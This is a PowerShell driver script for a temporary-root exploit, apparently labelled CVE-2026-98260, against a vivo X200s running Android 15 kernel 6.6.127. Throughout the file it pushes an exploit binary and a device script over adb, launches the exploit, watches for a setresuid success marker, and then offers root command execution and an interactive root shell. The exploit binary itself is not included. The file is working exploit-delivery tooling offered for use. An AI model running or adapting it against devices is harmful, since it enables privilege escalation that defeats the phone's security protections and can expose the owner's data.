# =============================================================================
#  getroot.ps1 - host-side helper for the CVE-2026-98260 temporary root
#                (vivo X200s / V2458A, 6.6.127-android15, NON-KernelSU)
#
#  Pushes work/vivo/own121 + getroot.sh to /data/local/tmp and drives them.
#
#  What this version does:
#    * every host step is timestamped; the device script timestamps its own
#      pre-run check, launch, wait polls, probe and rc lines;
#    * 'start' and 'cmd' echo the exploit/shell output LIVE in this console
#      (adb shell inherits the console, nothing is buffered until the end);
#      the device script itself runs a `tail -f` on the exploit log;
#    * 'start' polls every 5 s (configurable), stops early on the
#      [rootsh] setresuid marker, gate markers, failure markers or a reboot,
#      with a total cap of 90 s by default;
#    * a pre-run environment check (device present, sys.boot_completed,
#      uptime, /sys/kernel/tracing, own121, .lock2/session state) aborts with
#      a clear message instead of starting blind.
#
#  Examples (from this folder):
#    .\getroot.ps1 check
#    .\getroot.ps1 start
#    .\getroot.ps1 cmd "id; getprop ro.product.model"
#    .\getroot.ps1 shell
#    .\getroot.ps1 status
#    .\getroot.ps1 stop
#    .\getroot.ps1 -Serial <serial> -Tmo 60 -Poll 5 start
#
#  The root session exists only on the device, only until reboot.
# =============================================================================
[CmdletBinding()]
param(
    [Parameter(Position = 0)][string]$Action = 'start',
    [Parameter(Position = 1)][string]$Command = '',
    [string]$Serial = '',
    [int]$Tmo = 90,
    [int]$Poll = 5
)

# Native adb writes progress to stderr; PowerShell 5.1 + 'Stop' turns that into a
# terminating NativeCommandError even with 2>$null, so keep Continue and check
# $LASTEXITCODE explicitly after every adb call.
$ErrorActionPreference = 'Continue'

$Dev = '/data/local/tmp'

function Get-Stamp { Get-Date -Format 'HH:mm:ss' }
function Say { param([string]$Msg) Write-Host ("[{0}] [getroot] {1}" -f (Get-Stamp), $Msg) }
function SayWarn { param([string]$Msg) Write-Host ("[{0}] [getroot][WARN] {1}" -f (Get-Stamp), $Msg) -ForegroundColor Yellow }
function SayErr { param([string]$Msg) Write-Host ("[{0}] [getroot][ERR] {1}" -f (Get-Stamp), $Msg) -ForegroundColor Red }
function Fail {
    param([string]$Msg, [int]$Code = 1)
    SayErr $Msg
    exit $Code
}

# --- adb -------------------------------------------------------------------
$Adb = $null
if ($env:ADB -and (Test-Path -LiteralPath $env:ADB)) { $Adb = $env:ADB }
$AdbCandidates = @(
    'C:\platform-tools\adb.exe',
    (Join-Path $env:LOCALAPPDATA 'Android\Sdk\platform-tools\adb.exe')
)
if (-not $Adb) {
    $Adb = $AdbCandidates | Where-Object { Test-Path -LiteralPath $_ } | Select-Object -First 1
}
if (-not $Adb) {
    $c = Get-Command adb.exe -ErrorAction SilentlyContinue
    if ($c) { $Adb = $c.Source }
}
if (-not $Adb) { Fail 'adb.exe not found (expected C:\platform-tools\adb.exe); put platform-tools on PATH or set ADB' 2 }

# --- local files -----------------------------------------------------------
$BinLocal = $null
if ($env:GR_BIN -and (Test-Path -LiteralPath $env:GR_BIN)) { $BinLocal = $env:GR_BIN }
if (-not $BinLocal) {
    $cand = Join-Path $PSScriptRoot 'own121'
    if (Test-Path -LiteralPath $cand) { $BinLocal = $cand }
    else {
        $cand = Join-Path (Split-Path -Parent $PSScriptRoot) 'own121'
        if (Test-Path -LiteralPath $cand) { $BinLocal = $cand }
    }
}
$ShLocal = Join-Path $PSScriptRoot 'getroot.sh'
if (-not $BinLocal -or -not (Test-Path -LiteralPath $BinLocal)) {
    Fail 'missing local binary: work/vivo/own121 (set GR_BIN to override)' 2
}
if (-not (Test-Path -LiteralPath $ShLocal)) { Fail "missing local script: $ShLocal" 2 }
if ($Tmo -lt 10 -or $Tmo -gt 300) { Fail '-Tmo must be 10..300 seconds' 2 }
if ($Poll -lt 1 -or $Poll -gt 30) { Fail '-Poll must be 1..30 seconds' 2 }

$script:AdbArgs = @()
$script:LastRc = 0

function Initialize-Device {
    $lines = @(& $Adb devices 2>$null)
    if ($LASTEXITCODE -ne 0) { Fail 'adb devices failed - check the adb installation' 2 }
    $devs = @()
    foreach ($l in $lines) {
        if ($l -match '^(\S+)\s+device\b') { $devs += $Matches[1] }
        elseif ($l -match '^(\S+)\s+unauthorized') {
            Fail ("device {0} is unauthorized - accept the USB debugging prompt on the phone" -f $Matches[1]) 2
        }
    }
    if (-not $Serial) {
        if ($devs.Count -eq 0) { Fail 'no device in "adb devices" - connect the phone and enable USB debugging' 2 }
        if ($devs.Count -gt 1) { Fail ("multiple devices ({0}) - pick one with -Serial" -f ($devs -join ', ')) 2 }
        $Serial = $devs[0]
    }
    elseif ($devs -notcontains $Serial) {
        Fail ("serial '{0}' is not in 'adb devices' (offline or wrong serial)" -f $Serial) 2
    }
    $script:AdbArgs = @('-s', $Serial)
    Say ("device: {0}" -f $Serial)
    Say ("adb:    {0}" -f $Adb)
}

function Test-BootCompleted {
    $bc = (& $Adb @script:AdbArgs shell getprop sys.boot_completed 2>$null | Out-String).Trim()
    return ($bc -eq '1')
}

function Assert-BootCompleted {
    if (Test-BootCompleted) { return }
    $bc = (& $Adb @script:AdbArgs shell getprop sys.boot_completed 2>$null | Out-String).Trim()
    Fail ("device boot is not finished (sys.boot_completed='{0}'); wait for Android to boot, then retry" -f $bc) 3
}

function Show-Uptime {
    $u = (& $Adb @script:AdbArgs shell cat /proc/uptime 2>$null | Out-String).Trim()
    if ($u -match '^(\d+)') {
        $sec = [int]$Matches[1]
        if ($sec -lt 40) { Say ("uptime: {0}s (fresh-boot window)" -f $sec) }
        elseif ($sec -lt 180) { SayWarn ("uptime: {0}s - late (preferred < 40s after boot)" -f $sec) }
        else { SayWarn ("uptime: {0}s - old boot (preferred < 40s); reboot first or expect a failed run" -f $sec) }
    }
}

# Runs a remote command through adb shell, streaming its output straight to
# this console, and records the exit code in $script:LastRc.
function Invoke-Remote {
    param([Parameter(Mandatory = $true, ValueFromRemainingArguments = $true)][string[]]$Rest)
    & $Adb @script:AdbArgs shell @Rest 2>$null
    $script:LastRc = $LASTEXITCODE
}

function Get-LocalSha {
    param([string]$Path)
    return (Get-FileHash -LiteralPath $Path -Algorithm SHA256).Hash.ToLowerInvariant()
}

function Push-Files {
    # The phone can zero-fill a file whose adb push is interrupted by a reboot
    # (same byte size, all NULs), so compare content, not size.  The 500 KB
    # own121 is skipped only when its sha256 already matches; getroot.sh is
    # small and always re-pushed (so an edit is never missed).
    $localSha = Get-LocalSha $BinLocal
    $remoteSha = (& $Adb @script:AdbArgs shell ("sha256sum {0}/own121" -f $Dev) 2>$null | Out-String).Trim()
    if ($remoteSha -match '^([0-9a-fA-F]{64})' -and $Matches[1].ToLowerInvariant() -eq $localSha) {
        Say 'own121 already on device (sha256 match) - skip binary push'
    }
    else {
        $localSize = (Get-Item -LiteralPath $BinLocal).Length
        Say ("push {0} ({1} bytes) -> {2}/own121" -f (Split-Path -Leaf $BinLocal), $localSize, $Dev)
        & $Adb @script:AdbArgs push $BinLocal "$Dev/own121" 2>$null
        if ($LASTEXITCODE -ne 0) { Fail "adb push failed for $BinLocal" 2 }
    }
    $shSize = (Get-Item -LiteralPath $ShLocal).Length
    Say ("push getroot.sh ({0} bytes) -> {1}/getroot.sh" -f $shSize, $Dev)
    & $Adb @script:AdbArgs push $ShLocal "$Dev/getroot.sh" 2>$null
    if ($LASTEXITCODE -ne 0) { Fail "adb push failed for $ShLocal" 2 }
    & $Adb @script:AdbArgs shell "chmod 755 $Dev/own121 $Dev/getroot.sh" 2>$null
    if ($LASTEXITCODE -ne 0) { Fail 'adb shell chmod failed' 2 }
    Say 'files ready'
}

function Remote-Start {
    Say ("starting exploit: poll {0}s, cap {1}s, live output below" -f $Poll, $Tmo)
    Invoke-Remote ("TMO={0} POLL={1} sh {2}/getroot.sh start" -f $Tmo, $Poll, $Dev)
    if ($script:LastRc -ne 0) {
        SayErr ("start failed (rc={0})" -f $script:LastRc)
        SayErr 'if adb reported "device offline/closed" the phone rebooted; wait for boot, then run check'
        exit $script:LastRc
    }
    $st = (& $Adb @script:AdbArgs shell ("sh {0}/getroot.sh status" -f $Dev) 2>$null | Out-String)
    if ($st -match 'channel: RUNNING') {
        Say 'verified: the root channel is RUNNING on the device'
    }
    else {
        SayErr 'the device script returned success but the channel is NOT running'
        Write-Host $st
        SayErr 'if the phone rebooted during start, wait for boot and run start again'
        exit 1
    }
    Say 'start finished; the root channel stays up on the device'
}

function Remote-Cmd {
    param([string]$CmdText)
    $tmp = Join-Path ([IO.Path]::GetTempPath()) ("gr_cmd_{0}_{1}.txt" -f (Get-Random), (Get-Random))
    $text = $CmdText -replace "`r`n", "`n" -replace "`r", "`n"
    [IO.File]::WriteAllText($tmp, $text, (New-Object System.Text.UTF8Encoding($false)))
    Say 'sending command to the root channel (output streams live)'
    $rc = 0
    try {
        & $Adb @script:AdbArgs push $tmp "$Dev/.gr_cmd" 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) { Fail 'adb push failed for the command file' 2 }
        Invoke-Remote ("TMO={0} sh {1}/getroot.sh cmdfile {1}/.gr_cmd" -f $Tmo, $Dev)
        $rc = $script:LastRc
    }
    finally {
        Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue
        & $Adb @script:AdbArgs shell "rm -f $Dev/.gr_cmd" 2>$null | Out-Null
    }
    if ($rc -ne 0) { SayErr ("command exited rc={0}" -f $rc) }
    exit $rc
}

# --- dispatch --------------------------------------------------------------
switch ($Action.ToLowerInvariant()) {
    'push' {
        Initialize-Device
        Assert-BootCompleted
        Push-Files
    }
    'check' {
        Initialize-Device
        Assert-BootCompleted
        Push-Files
        Show-Uptime
        Say 'device-side pre-run environment check'
        Invoke-Remote ("sh {0}/getroot.sh check" -f $Dev)
        exit $script:LastRc
    }
    'start' {
        Initialize-Device
        Assert-BootCompleted
        Push-Files
        Show-Uptime
        Remote-Start
    }
    'cmd' {
        if (-not $Command) { Fail "usage: .\getroot.ps1 cmd '<command>'" 2 }
        Initialize-Device
        Assert-BootCompleted
        Push-Files
        Remote-Cmd $Command
    }
    'shell' {
        Initialize-Device
        Assert-BootCompleted
        Push-Files
        Say 'handing the console to the interactive root shell (exit / Ctrl-D to leave)'
        Invoke-Remote '-t' ("sh {0}/getroot.sh shell" -f $Dev)
        exit $script:LastRc
    }
    'status' {
        Initialize-Device
        Invoke-Remote ("sh {0}/getroot.sh status" -f $Dev)
        exit $script:LastRc
    }
    'stop' {
        Initialize-Device
        Invoke-Remote ("sh {0}/getroot.sh stop" -f $Dev)
        exit $script:LastRc
    }
    default {
        Write-Host @'
getroot.ps1 - CVE-2026-98260 temporary root (no KernelSU)

  .\getroot.ps1 check              pre-run environment check (device side too)
  .\getroot.ps1 start              escalate + start the root channel (live log)
  .\getroot.ps1 cmd '<command>'    run a command as root (live output, rc)
  .\getroot.ps1 shell              interactive root shell
  .\getroot.ps1 status             channel state + last log lines
  .\getroot.ps1 stop               end the root shell (reboot to clean up)
  .\getroot.ps1 push               only push own121 + getroot.sh

  -Serial <serial>                 pick a device (default: the only one)
  -Tmo <seconds>                   total startup wait cap (default 90)
  -Poll <seconds>                  startup poll interval (default 5)
'@
    }
}
